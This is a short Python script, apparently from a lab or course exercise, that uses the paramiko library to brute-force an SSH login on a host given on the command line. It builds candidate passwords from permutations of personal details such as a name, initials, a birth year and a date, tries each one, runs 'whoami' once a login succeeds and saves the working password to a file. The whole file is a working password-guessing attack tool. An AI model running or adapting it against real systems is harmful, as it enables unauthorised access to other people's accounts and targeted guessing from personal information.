#!/usr/bin/python3

import paramiko
from itertools import permutations, combinations
import sys

dic=["YueHan","Wang","YH","1999","0228","oscar","Realtek","@ _"]

ip=sys.argv[1]


def sshconnect(pwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip,22,"attacker",pwd)
    except paramiko.AuthenticationException:
        ssh.close()
        # print(pwd,"Unsucessful!")
        return 0
    else:
        stdin, stdout, stderr = ssh.exec_command("whoami")
        # print(stdout.readlines())
        ssh.close()
    return 1

def main():
    for i in range(2,3):
        for strlist in list(permutations(dic,i)):
            # print("".join(strlist))
            pwd = "".join(strlist)
            # pwd = "victim"
            if sshconnect(pwd) == 1: 
                # print(i,pwd,"Yes!");
                file = open("password.txt","w")
                file.write(pwd)
                file.close()
                return;
            else: print(i,pwd,"No!");

# if __name__ =="__main__":
#     main()
main()


